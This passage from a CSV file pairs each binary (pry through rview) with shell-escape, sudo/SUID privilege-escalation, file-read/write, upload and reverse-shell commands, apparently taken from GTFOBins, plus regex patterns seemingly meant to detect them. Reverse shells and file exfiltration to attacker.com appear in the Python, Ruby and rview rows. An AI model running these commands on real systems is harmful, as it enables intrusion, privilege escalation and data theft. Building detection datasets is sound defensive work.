system(""/bin/sh"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pry\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
pry,sudo,"sudo pry
system(""/bin/sh"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pry\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
pry,limited-suid,"./pry
system(""/bin/sh"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pry\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
psftp,shell,"psftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?psftp\s+(?:/bin/(?:sh|bash))),
psftp,limited-suid,"sudo psftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?psftp\s+(?:/bin/(?:sh|bash))),
psftp,sudo,"sudo psftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?psftp\s+(?:/bin/(?:sh|bash))),
psql,shell,"psql
\?
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?psql\s+(?:/bin/(?:sh|bash))),
psql,sudo,"psql
\?
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?psql\s+(?:/bin/(?:sh|bash))),
ptx,file-read,"ptx -w 5000 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ptx\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ptx,suid,"./ptx -w 5000 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ptx\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ptx,sudo,"sudo ptx -w 5000 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ptx\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
puppet,shell,"puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-e\s*\-c\s*\-i\s+(?:/bin/(?:sh|bash))),
puppet,file-write,"puppet apply -e ""file { '$LFILE': content => 'DATA' }""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file path must be absolute.
puppet,file-read,puppet filebucket -l diff /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-l\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.
puppet,sudo,"sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?puppet\s*\-e\s*\-c\s*\-i\s+(?:/bin/(?:sh|bash))),
pwsh,shell,pwsh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pwsh\s+.+),
pwsh,file-write,"export LFILE=file_to_write
pwsh -c '""DATA"" | Out-File $env:LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pwsh\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
pwsh,sudo,sudo pwsh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?pwsh\s+.+),
python,shell,"python -c 'import os; os.system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b))",
python,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
python,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
python,file-upload,"export LPORT=8888
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server.
python,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
python,file-write,"python -c 'open(""file_to_write"",""w+"").write(""DATA"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
python,file-read,"python -c 'print(open(""file_to_read"").read())'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
python,library-load,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:\bimport\b)),
python,suid,"./python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
python,sudo,"sudo python -c 'import os; os.system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b))",
python,capabilities,"./python -c 'import os; os.setuid(0); os.system(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?python\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bimport\b))",
rake,file-read,rake -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is actually parsed and the first wrong line is returned in an error message.
rake,shell,rake -p '`/bin/sh 1>&0`',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-p\s+(?:/bin/(?:sh|bash))),
rake,sudo,sudo rake -p '`/bin/sh 1>&0`',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-p\s+(?:/bin/(?:sh|bash))),
rake,limited-suid,./rake -p '`/bin/sh 1>&0`',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rake\s*\-p\s+(?:/bin/(?:sh|bash))),
rc,shell,rc -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rc\s*\-c\s+(?:/bin/(?:sh|bash))),
rc,suid,./rc -c '/bin/sh -p',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rc\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
rc,sudo,sudo rc -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rc\s*\-c\s+(?:/bin/(?:sh|bash))),
readelf,file-read,readelf -a @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?readelf\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
readelf,suid,./readelf -a @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?readelf\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
readelf,sudo,sudo readelf -a @$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?readelf\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
red,file-write,"red file_to_write
a
DATA
.
w
q","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?red\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
red,file-read,"red file_to_read
,p
q",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?red\s+.+),
red,sudo,"sudo red file_to_write
a
DATA
.
w
q","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?red\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
redcarpet,file-read,"redcarpet ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?redcarpet\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
redcarpet,sudo,"sudo redcarpet ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?redcarpet\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
redis,file-write,"redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x ""DATA""
save","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?redis\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes."
restic,file-upload,"restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?restic\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
restic,sudo,"sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?restic\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
restic,suid,"./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?restic\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
rev,file-read,rev $LFILE | rev,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rev\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
rev,suid,./rev $LFILE | rev,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rev\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
rev,sudo,sudo rev $LFILE | rev,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rev\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
rlogin,file-upload,"rlogin -l ""$(cat $LFILE)"" -p $RPORT $RHOST","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rlogin\s*\-l\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send contents of a file to a TCP port. Run `nc -l -p 12345 > ""file_to_save""` on the attacker system to capture the contents.

`rlogin` hangs waiting for the remote peer to close the socket.

The file is corrupted by leading and trailing spurious data.
"
rlwrap,shell,rlwrap /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s+(?:/bin/(?:sh|bash))),
rlwrap,file-write,"rlwrap -l ""$LFILE"" echo DATA","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s*\-l\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This adds timestamps to the output file. This relies on the external `echo` command.
rlwrap,suid,./rlwrap -H /dev/null /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s*\-H\s*\-p\s+(?:/bin/(?:sh|bash))),
rlwrap,sudo,sudo rlwrap /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rlwrap\s+(?:/bin/(?:sh|bash))),
rpm,shell,"rpm --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpm\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpm,shell,rpm --pipe '/bin/sh 0<&1',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpm\s*\-\-pipe\s+(?:/bin/(?:sh|bash))),
rpm,limited-suid,"./rpm --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpm\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpm,sudo,"sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpm\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpm,sudo,sudo rpm -ivh x-1.0-1.noarch.rpm,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpm\s+.+),"It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
"
rpmdb,shell,rpmdb --eval '%(/bin/sh 1>&2)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmdb\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpmdb,limited-suid,./rpmdb --eval '%(/bin/sh 1>&2)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmdb\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpmdb,sudo,sudo rpmdb --eval '%(/bin/sh 1>&2)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmdb\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpmquery,shell,"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmquery\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
rpmquery,limited-suid,"./rpmquery --eval '%{lua:os.execute(""/bin/sh"")}'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmquery\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpmquery,sudo,"sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmquery\s*\-\-eval\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
rpmverify,shell,rpmverify --eval '%(/bin/sh 1>&2)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmverify\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpmverify,limited-suid,./rpmverify --eval '%(/bin/sh 1>&2)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmverify\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rpmverify,sudo,sudo rpmverify --eval '%(/bin/sh 1>&2)',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rpmverify\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
rsync,shell,"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rsync\s*\-e\s*\-c\s+.+),
rsync,sudo,"sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rsync\s*\-e\s*\-c\s+.+),
rsync,suid,"./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rsync\s*\-e\s*\-p\s*\-c\s+.+),
rtorrent,shell,"echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
rtorrent",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rtorrent\s+(?:/bin/(?:sh|bash))),
rtorrent,suid,"echo ""execute = /bin/sh,-p,-c,\""/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
./rtorrent",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rtorrent\s*\-p\s+(?:/bin/(?:sh|bash))),
ruby,shell,"ruby -e 'exec ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+(?:/bin/(?:sh|bash))),
ruby,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
ruby,file-upload,"export LPORT=8888
ruby -run -e httpd . -p $LPORT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.
ruby,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
ruby,file-write,"ruby -e 'File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ruby,file-read,"ruby -e 'puts File.read(""file_to_read"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ruby,library-load,"ruby -e 'require ""fiddle""; Fiddle.dlopen(""lib.so"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+.+),
ruby,sudo,"sudo ruby -e 'exec ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+(?:/bin/(?:sh|bash))),
ruby,capabilities,"./ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ruby\s*\-e\s+(?:/bin/(?:sh|bash))),
run-mailcap,shell,"run-mailcap --action=view /etc/hosts
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s*\-\-action\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
run-mailcap,file-read,run-mailcap --action=view file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s*\-\-action\s+.+),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
run-mailcap,file-write,run-mailcap --action=edit file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s*\-\-action\s+.+),"The file must exist and be not empty.

This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.
"
run-mailcap,sudo,"sudo run-mailcap --action=view /etc/hosts
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?run\-mailcap\s*\-\-action\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
run-parts,shell,run-parts --new-session --regex '^sh$' /bin,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?run\-parts\s*\-\-new\-session\s*\-\-regex\s+.+),
run-parts,sudo,sudo run-parts --new-session --regex '^sh$' /bin,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?run\-parts\s*\-\-new\-session\s*\-\-regex\s+.+),
run-parts,suid,./run-parts --new-session --regex '^sh$' /bin --arg='-p',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?run\-parts\s*\-\-new\-session\s*\-\-regex\s*\-\-arg\s+.+),
runscript,shell,"echo '! exec /bin/sh' >$TF
runscript $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?runscript\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
runscript,limited-suid,"echo '! exec /bin/sh' >$TF
./runscript $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?runscript\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
runscript,sudo,"echo '! exec /bin/sh' >$TF
sudo runscript $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?runscript\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
rview,shell,"rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.
rview,shell,"rview -c ':lua os.execute(""reset; exec sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+.+),This requires that `rview` is compiled with Lua support.
rview,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")
vim.command("":q!"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?rview\s*\-c\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
rview,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
rview -c ':lua local s=require(""socket""); local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
